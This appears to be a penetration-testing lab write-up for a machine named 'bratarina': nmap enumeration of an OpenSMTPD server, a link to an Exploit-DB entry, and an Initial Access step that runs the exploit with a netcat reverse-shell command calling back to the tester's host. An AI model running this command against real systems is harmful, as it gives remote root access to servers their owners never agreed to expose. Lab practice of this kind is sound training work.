# System Information
OS: Ubuntu Linux
IP: 192.168.112.71

---
# Service Enumeration

## 22/tcp SSH
OpenSSH 7.6p1 Ubuntu 4ubuntu0.3

## 25/tcp SMTP

```
PORT   STATE SERVICE REASON         VERSION
25/tcp open  smtp    syn-ack ttl 61 OpenSMTPD
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.194], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
|_banner: 220 bratarina ESMTP OpenSMTPD
Service Info: Host: bratarina


```

https://www.exploit-db.com/exploits/47984 For versions < 6.6.2... so this should definitely be vulnerable, at 2.0.0.

Jump to Initial Access.

## 80/tcp HTTP

## 445/tcp SMB

# Initial Access

I had to try this command many times, as most ports are blocked by the target's firewall.

`python3 47984.py $IP 25 'busybox nc 192.168.45.194 80 -e bash'`

We land as root, so no privilege escalation is necessary.

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

![[Pasted image 20260827170136.png]]
